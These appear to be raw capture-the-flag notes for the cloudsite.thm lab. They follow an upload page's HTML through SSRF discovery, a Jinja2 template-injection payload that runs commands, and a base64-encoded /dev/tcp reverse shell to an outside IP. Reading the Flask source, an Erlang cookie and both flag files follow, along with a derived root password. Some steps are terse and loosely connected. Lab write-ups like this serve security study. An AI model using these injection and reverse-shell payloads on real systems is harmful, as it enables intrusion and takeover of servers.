    <link
      rel="stylesheet"
      href="/assets/plugins/testimonial/css/owl.theme.min.css"
    />
    <link rel="stylesheet" href="/assets/css/style.css" />
    <link
      href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link
      rel="stylesheet"
      href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"
    />

    <link rel="stylesheet" href="/css/style.css" />
  </head>

  <body>
    <!-- ***************************** Head Starts Here *********************************-->
    <div class="head-cover">
      <header id="menu-jk" class="container-fluid">
        <div class="container">
          <div class="row head-ro">
            <div class="col-md-3 logo">
              <img src="/assets/images/logo.png" alt="" />

              <a
                class="d-md-none small-menu"
                data-bs-toggle="collapse"
                href="#collapseExample"
                role="button"
                aria-expanded="false"
                aria-controls="collapseExample"
              >
                <i class="fas d-lg-none fa-bars"></i>
              </a>
            </div>
            <div id="collapseExample" class="col-md-9 nav">
              <ul>
                <li><a href="http://cloudsite.thm/">Home</a></li>
                <li><a href="http://cloudsite.thm/about_us.html">About Us</a></li>
                <li><a href="http://cloudsite.thm/services.html">Services</a></li>
                <li><a href="http://cloudsite.thm/blog.html">Blog</a></li>
                <li><a href="http://cloudsite.thm/contact_us.html">Contact Us</a></li>
                <li class="btnll"><button class="btn btn-sm btn-primary" id="logoutButton">Logout</button></li>
              </ul>
            </div>
          </div>
        </div>
      </header>
    </div>

    <!--********************************* Login Page Starts Here ********************************************-->
    <section class="ftco-section">
        <div class="container">
          <div class="row justify-content-center">
            <div class="col-md-6 text-center mb-5">
              <h2 class="heading-section">Welcome to Secure File Storage</h2>
            </div>
          </div>
          <div class="row justify-content-center">
            <div class="col-md-7 col-lg-5">
              <div class="login-wrap p-4 p-md-5">
                <div
                  class="icon d-flex align-items-center justify-content-center"
                >
                  <span class="fa fa-upload"></span>
                </div>
                <h3 class="text-center mb-4">Upload From Localhost</h3>
                <div class="uploadLocalhost"></div>
                <form id="uploadForm">
                  <div class="form-group">
                    <input
                      type="file"
                      class="form-control rounded-left"
                      style="height: 38px;"
                      id="fileInput"
                      required
                    />
                  </div>
                  <div class="form-group">
                    <button
                      type="submit"
                      class="form-control btn btn-primary rounded submit px-3"
                    >
                      Upload
                    </button>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      </section>

      <section class="ftco-section">
        <div class="container">
          <div class="row justify-content-center">
          </div>
          <div class="row justify-content-center">
            <div class="col-md-7 col-lg-5">
              <div class="login-wrap p-4 p-md-5">
                <div
                  class="icon d-flex align-items-center justify-content-center"
                >
                  <span class="fa fa-upload"></span>
                </div>
                <h3 class="text-center mb-4">Upload From URL</h3>
                <div class="uploadUrl"></div>
                <form id="urlForm">
                  <div class="form-group">
                    <input
                      type="text"
                      class="form-control rounded-left"
                      placeholder="Enter URL"
                      id="urlInput"
                      required
                    />
                  </div>
                  <div class="form-group">
                    <button
                      type="submit"
                      class="form-control btn btn-primary rounded submit px-3"
                    >
                      Upload
                    </button>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      </section>

      <section class="ftco-section">
        <div class="container">
          <div class="row justify-content-center">
          </div>
          <div class="row justify-content-center">
            <div class="col-md-7 col-lg-5">
              <div class="login-wrap p-4 p-md-5">
                <div
                  class="icon d-flex align-items-center justify-content-center"
                >
                  <span class="fa fa-upload"></span>
                </div>
                <h3 class="text-center mb-4">Uploaded Files</h3>
                <h6>Note: File extensions are removed for security reasons.</h6>
                <div id="fileContainer"></div>
              </div>
            </div>
          </div>
        </div>
      </section>

    <!--********************************* Footer Starts Here ********************************************-->

    <footer>
      <div class="container">
        <div class="row">
          <div class="col-md-3 about">
            <h2>About Us</h2>
            <p>
              Phasellus scelerisque ornare nisl sit amet pulvinar. Nunc non
              scelerisque augue. Proin et sollicitudin velit.
            </p>

            <div class="foot-address">
              <div class="icon">
                <i class="fas fa-map-marker-alt"></i>
              </div>
              <div class="addet">
                BlueDart Marthandam (K.K District) Tamil Nadu, IND
              </div>
            </div>
            <div class="foot-address">
              <div class="icon">
                <i class="far fa-envelope-open"></i>
              </div>
              <div class="addet">
                info@smarteyeapps.com <br />
                sales@smarteyeapps.com
              </div>
            </div>
            <div class="foot-address">
              <div class="icon">
                <i class="fas fa-mobile-alt"></i>
              </div>
              <div class="addet">
                +23 323 43434 <br />
                +1 3232 434 55
              </div>
            </div>
          </div>
          <div class="col-md-3 fotblog">
            <h2>From latest Blog</h2>
            <div class="blohjb">
              <p>
                dignissim. Integer tempor facilisis malesuada. Proin ac varius
                velit, tincidunt condimentum
              </p>
              <span>22-1-2019</span>
            </div>
            <div class="blohjb">
              <p>
                dignissim. Integer tempor facilisis malesuada. Proin ac varius
                velit, tincidunt condimentum
              </p>
              <span>22-1-2019</span>
            </div>
            <div class="blohjb">
              <p>
                dignissim. Integer tempor facilisis malesuada. Proin ac varius
                velit, tincidunt condimentum
              </p>
              <span>22-1-2019</span>
            </div>
          </div>
          <div class="col-md-3 glink">
            <ul>
              <li>
                <a href="http://cloudsite.thm/"
                  ><i class="fas fa-angle-double-right"></i>Home</a
                >
              </li>
              <li>
                <a href="http://cloudsite.thm/about_us.html"
                  ><i class="fas fa-angle-double-right"></i>About Us</a
                >
              </li>
              <li>
                <a href="http://cloudsite.thm/services.html"
                  ><i class="fas fa-angle-double-right"></i>Services</a
                >
              </li>
              <li>
                <a href="http://cloudsite.thm/blog.html"
                  ><i class="fas fa-angle-double-right"></i>Blog</a
                >
              </li>
              <li>
                <a href="http://cloudsite.thm/contact_us.html"
                  ><i class="fas fa-angle-double-right"></i>Contact Us</a
                >
              </li>
            </ul>
          </div>
          <div class="col-md-3 tags">
            <h2>Easy Tags</h2>
            <ul>
              <li>Finance</li>
              <li>Web Design</li>
              <li>Internet Pro</li>
              <li>Node Js</li>
              <li>Java Swing</li>
              <li>Angular Js</li>
              <li>Vue Js</li>
            </ul>
          </div>
        </div>
      </div>
    </footer>
    <div class="copy">
      <div class="container">
        <a href="https://www.smarteyeapps.com/"
          >2015 &copy; All Rights Reserved | Designed and Developed by
          Smarteyeapps</a
        >
        <span>
          <a><i class="fab fa-github"></i></a>
          <a><i class="fab fa-google-plus-g"></i></a>
          <a><i class="fab fa-pinterest-p"></i></a>
          <a><i class="fab fa-twitter"></i></a>
          <a><i class="fab fa-facebook-f"></i></a>
        </span>
      </div>
    </div>
  </body>

  <script src="/assets/js/jquery-3.2.1.min.js"></script>
  <script src="/assets/js/bootstrap.min.js"></script>
  <script src="/assets/plugins/testimonial/js/owl.carousel.min.js"></script>
  <script src="/assets/plugins/scroll-fixed/jquery-scrolltofixed-min.js"></script>
  <script src="/assets/js/script.js"></script>
  <script src="/js/jquery.min.js"></script>
  <script src="/js/popper.js"></script>
  <script src="/js/bootstrap.min.js"></script>
  <script src="/js/main.js"></script>
  <script src="/assets/js/custom_script_active.js"></script>
  <script src="/assets/js/logout.js"></script>
</html>


confirmed ssrf port 3000 using http://127.0.0.1:3000/api/docs

Endpoints Perfectly Completed

POST Requests:
/api/register - For registering user
/api/login - For loggin in the user
/api/upload - For uploading files
/api/store-url - For uploadion files via url
/api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future.

GET Requests:
/api/uploads/filename - To view the uploaded files
/dashboard/inactive - Dashboard for inactive user
/dashboard/active - Dashboard for active user

Note: All requests to this endpoint are sent in JSON format.

/api/fetch_messeges_from_chatbot 
"GET method not allowed"

POST /api/fetch_messeges_from_chatbot HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: */*
Accept-Language: en-GB,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Connection: close
Cookie: jtw=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGhtLmNvbSIsInN1YnNjcmlwdGlvbiI6ImFjdGl2ZSIsImlhdCI6MTc3MTc3MTc3OCwiZXhwIjoxNzcxNzc1Mzc4fQ.o8m20OUaYQRuPYKM-DpRBqZaeQ5FZWb3H0gfCVxcqo
Content-Length: 21

{"message":"hello"}

{ "error": "username parameter is required" }

Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGhtLmNvbSIsInN1YnNjcmlwdGlvbiI6ImFjdGl2ZSIsImlhdCI6MTc3MTc3MTc3OCwiZXhwIjoxNzcxNzc1Mzc4fQ.o8m20OUaYQRuPYKM-DpRBqgZaeQ5FZWb3H0gfCVxcqo

POST /api/fetch_messeges_from_chatbot HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Accept: */*
Content-Type: application/json
Connection: close
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGhtLmNvbSIsInN1YnNjcmlwdGlvbiI6ImFjdGl2ZSIsImlhdCI6MTc3MTc3MTc3OCwiZXhwIjoxNzcxNzc1Mzc4fQ.o8m20OUaYQRuPYKM-DpRBqgZaeQ5FZWb3H0gfCVxcqo
Content-Length: 21

{"username":"true"}

research found SSTI -> Jinja2 

{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

POST /api/fetch_messeges_from_chatbot HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Accept: */*
Content-Type: application/json
Connection: close
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGhtLmNvbSIsInN1YnNjcmlwdGlvbiI6ImFjdGl2ZSIsImlhdCI6MTc3MTc3MTc3OCwiZXhwIjoxNzcxNzc1Mzc4fQ.o8m20OUaYQRuPYKM-DpRBqgZaeQ5FZWb3H0gfCVxcqo
Content-Length: 21

{"username":"{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"}#

Sorry, uid=1000(azrael) gid=1000(azrael) groups=1000(azrael) , our chatbot server is currently under development.

rev shell base 64 encoded 

POST /api/fetch_messeges_from_chatbot HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Accept: */*
Content-Type: application/json
Connection: close
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGhtLmNvbSIsInN1YnNjcmlwdGlvbiI6ImFjdGl2ZSIsImlhdCI6MTc3MTc3MTc3OCwiZXhwIjoxNzcxNzc1Mzc4fQ.o8m20OUaYQRuPYKM-DpRBqgZaeQ5FZWb3H0gfCVxcqo
Content-Length: 99

{"username":"{{request.application.__globals__.__builtins__.__import__('os').popen('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjgwLjExMi4xMTAuLzkwMDEgMD4mMQ== |base64 -d|bash').read()}}"}

azrael@forge:~/chatbotServer$ pwd
pwd
/home/azrael/chatbotServer


ls
chatbotServer
snap
user.txt
azrael@forge:~$ cat user.txt
cat user.txt
sudp
azrael@forge:~$ 

sudo -l
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
sudo: a password is required

snap
snap
The snap command lets you install, configure, refresh and remove snaps.
Snaps are packages that work across many different Linux distributions,
enabling secure delivery and operation of the latest apps and utilities.

Usage: snap <command> [<options>...]

Commonly used commands can be classified as follows:

           Basics: find, info, install, remove, list
          ...more: refresh, revert, switch, disable, enable, create-cohort
          History: changes, tasks, abort, watch
          Daemons: services, start, stop, restart, logs
      Permissions: connections, interface, connect, disconnect
    Configuration: get, set, unset, wait
      App Aliases: alias, aliases, unalias, prefer
          Account: login, logout, whoami
        Snapshots: saved, save, check-snapshot, restore, forget
           Device: model, remodel, reboot, recovery
     Quota Groups: set-quota, remove-quota, quotas, quota
  Validation Sets: validate
        ... Other: warnings, okay, known, ack, version
      Development: validate

For more information about a command, run 'snap help <command>'.
For a short summary of all commands, run 'snap help --all'.
azrael@forge:~$ 

cd chatbotServer
cd chatbotServer
azrael@forge:~/chatbotServer$ ls
ls
chatbot.py
__pycache__
templates

nano chatbot.py 

from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

@app.route('/', methods=['POST'])
def index():
    data = request.get_json()
    if not data or 'username' not in data:
        return jsonify({"error": "username parameter is required"}), 400
    
    username = data['username']
    template = '''<!DOCTYPE html>
<html lang="en">
 <head>
   <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Greeting</title>
 </head>
 <body>
   <h1>Sorry, {}, our chatbot server is currently under development.</h1>

cat /var/lib/rabbitmq/.erlang.cookie
cat /var/lib/rabbitmq/.erlang.cookie
ba9TFiUrLjmgIPuTazrael@forge:


echo 49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF | base64 -d |xxd -p -c 100
e3d7ba85295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585

su root 
pass 295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585

cat /root/root.txt
eabf7a0b05d3f2028f3e0465d2fd0852


